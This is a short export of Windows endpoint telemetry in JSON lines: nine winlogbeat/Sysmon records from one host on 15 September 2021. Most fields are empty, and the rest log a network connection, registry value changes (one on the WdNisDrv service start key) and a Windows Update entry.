{"timestamp":"2021-09-15T16:38:49","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:49","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:55","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:55","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:56","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:56","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry value set (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Services\\WdNisDrv\\Start","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:56","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:56","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry value set (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\services.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:56","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:56","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:56","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:56","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:58","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:58","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:58","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:58","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:39:02","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:39:02","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Windows Update Agent","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
